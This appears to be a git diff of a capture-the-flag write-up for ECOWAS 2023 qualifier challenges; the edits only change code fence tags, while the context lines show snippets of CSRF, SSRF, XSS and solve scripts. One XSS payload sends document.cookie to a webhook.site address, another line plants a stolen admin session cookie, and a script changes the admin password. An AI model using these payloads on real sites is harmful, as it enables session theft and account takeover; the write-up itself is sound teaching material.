@@ -128,7 +128,7 @@ I checked the python script which was in the `/opt` directory and got this
 ![](https://hackmd.io/_uploads/SJ0HU_K6h.png)
 ![](https://hackmd.io/_uploads/r1-DIOY6h.png)
 
-```python=
+```python
 #!/usr/bin/env python3
 import subprocess
 import os
@@ -740,7 +740,7 @@ We are given the server python source code
 
 Here's the content
 
-```python=
+```python
 @app.route("/logout", methods=["GET", "POST"])
 def logout():
     session.clear()
@@ -874,7 +874,7 @@ We are given the source code the web server uses
 
 Here's the content
 
-```python=
+```python
 @app.before_request
 def session_start():
     if session.get("cart", None) is None:
@@ -967,7 +967,7 @@ We can try manually getting what ID the shoe `All-Star Flags` is
 
 But I noticed a function in the source code that lets us search value
 
-```python=
+```python
 @app.route("/search")
 def search():
     q = request.args.get("q", "")
@@ -1011,7 +1011,7 @@ We are given the source code
 
 Here's the content
 
-```python=
+```python
 @app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
@@ -1212,7 +1212,7 @@ Let us perform CSRF
 
 This is the script I'll be using:
 
-```js=
+```js
 <form action="https://ctftogo-ezrf.chals.io/flag" method="POST">
     <input type="text" name="secret" value="this-means-im-admin">
     <input id="btn" type="submit">
@@ -1247,7 +1247,7 @@ We are given the source code and it's written in PHP
 Checking it shows this
 ![](https://hackmd.io/_uploads/HkDT4zc62.png)
 
-```php=
+```php
 <?php
 
 namespace SharePhoto;
@@ -1318,7 +1318,7 @@ Let us continue viewing the source
 
 The show photo function looks interesting 
 
-```php=
+```php
 $app->get('/photo/{file_key}', function($request, $response, $args) {
     $fh = fopen(sprintf('uploads/%s', $args['file_key']), 'r');
     $stream = new \Slim\Http\Stream($fh);
@@ -1499,7 +1499,7 @@ And that's what I'm going to do here
 
 I made a [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/web/incredibly%20self-referential/ssrf.py) to automate the stress :slightly_smiling_face: 
 
-```python=
+```python
 import requests
 import re
 from base64 import b64decode
@@ -1626,7 +1626,7 @@ Here's the payload I used
 
 First `index.php` contained this
 
-```php=
+```php
 <?php
 if (isset($_GET['c'])) {
     $list = explode(";", $_GET['c']);
@@ -1661,7 +1661,7 @@ But I figured that that cookie is still mine
 
 Damn!! I switced to another payload
 
-```js=
+```js
 <img src=x onerror=this.src='https://webhook.site/ffc8b5af-72ff-40af-82a0-2aa305eead84/?'+document.cookie;>
 ```
 
@@ -1673,7 +1673,7 @@ And eventually I found a cookie that isn't the same as mine
 
 I replaced that with mine
 
-```js=
+```js
 document.cookie="session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZOynmw.oGpzuEW3SVgPjieWANzqQmPum94"
 ```
 
@@ -1800,7 +1800,7 @@ We can now leverage this to change the admin password
 
 Here's the exploit script
 
-```js=
+```js
 <script nonce=2726c7f26c>
 
   const url = 'https://ctftogo-b6247a6b4d3c-markdown-1.chals.io/profile';
@@ -1950,7 +1950,7 @@ Here's what my solve [script](https://github.com/markuched13/markuched13.github.
 
 Here's my solve script
 
-```python=
+```python
 import string
 import requests
 import time
@@ -2227,7 +2227,7 @@ I just used `z3` to find the right input value that meets that constaint
 
 Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/reverse%20engineering/sesame/solve.py)
 
-```python=
+```python
 from z3 import *
 
 def sesame(value):
@@ -2609,7 +2609,7 @@ I did that in python
 
 Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/reverse%20engineering/DotNetBin/solve.py)
 
-```python=
+```python
 from base64 import b64decode as d
 
 def xor(data, key):
@@ -2799,7 +2799,7 @@ I searched for writeups and found some links which helped me create solve script
 
 Here's the solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/reverse%20engineering/reZerv3/solve.py)
 
-```python=
+```python
 from z3 import *
 
 x = [BitVec('x%d' % i, 8) for i in range(42)]
@@ -2936,7 +2936,7 @@ And after getting `d` we can just decrypt ciphertext to get the plaintext which 
 
 Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/cryptography/Izrsa/solve.py)
 
-```python=
+```python
 from Crypto.Util.number import long_to_bytes, inverse
 
 N = 1209143407476550975641959824312993703149920344437422193042293131572745298662696284279928622412441255652391493241414170537319784298367821654726781089600780498369402167443363862621886943970468819656731959468058528787895569936536904387979815183897568006750131879851263753496120098205966442010445601534305483783759226510120860633770814540166419495817666312474484061885435295870436055727722073738662516644186716532891328742452198364825809508602208516407566578212780807
